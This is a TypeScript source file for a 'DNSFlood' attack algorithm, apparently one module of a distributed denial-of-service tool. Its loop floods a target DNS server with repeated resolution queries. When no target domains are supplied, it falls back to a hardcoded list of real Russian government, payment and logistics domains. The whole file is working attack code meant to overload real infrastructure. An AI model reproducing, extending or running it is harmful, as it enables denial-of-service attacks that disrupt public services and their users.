import IpRegex from './utils/ipRegex'
import isValidDomain from 'is-valid-domain'
import { Resolver } from 'dns/promises'

import { UDPFloodTarget } from '../external/targetsPool'
import { Algorithm, ExecutionResult } from './algorithm'

const BACKUP_SERVERS_DOMAINS = [
  'yandex.ru',
  'rostender.info',
  'gosuslugi.ru',
  'kremlin.ru',
  'government.ru',
  'pfr.gov.ru',
  'rkn.gov.ru',
  'mvd.gov.ru',
  'rostender.info',
  'cdek.ru',
  'datrans.ru',
  'qiwi.com',
  'svo.aero'
] as Array<string>

export class DNSFlood extends Algorithm {
  isValid (target: UDPFloodTarget): boolean {
    const result = typeof target.ip === 'string' &&
    IpRegex.v4({ exact: true, includeBoundaries: true }).test(target.ip) &&
    typeof target.port === 'number' &&
    target.port > 0 && target.port <= 65535
    if (result === false) { return false }

    if (target.domains !== undefined) {
      if (!Array.isArray(target.domains)) return false
      for (const domain of target.domains) {
        if (!isValidDomain(domain)) return false
      }
    }

    return true
  }

  canExecute (): boolean {
    return this.config.useRealIP
  }

  async execute (target: UDPFloodTarget, isRunning: () => boolean): Promise<ExecutionResult> {
    let packetsSend = 0
    let repeats = 48 + Math.floor(Math.random() * 32)
    const resolver = new Resolver({
      timeout: 10000
    })
    resolver.setServers([`${target.ip}:${target.port}`])

    const domainsList = (target.domains !== undefined && target.domains.length > 0) ? target.domains : BACKUP_SERVERS_DOMAINS

    let randomTarget = null as string | null

    while (repeats > 0 && isRunning()) {
      repeats -= 1

      if (randomTarget === null) {
        randomTarget = domainsList[Math.floor(Math.random() * domainsList.length)]
      }

      try {
        packetsSend += 1
        if (this.config.logRequests) {
          if (this.config.logTimestamp) {
            console.log(`${new Date().toISOString()} | DNS | ${target.ip} | ${target.port}`)
          } else {
            console.log(`DNS | ${target.ip} | ${target.port}`)
          }
        }
        await resolver.resolve4(randomTarget)
      } catch (e) {
        randomTarget = null
      }
    }

    return { packetsSend, packetsSuccess: 0, target, packetsNeutral: packetsSend }
  }
}
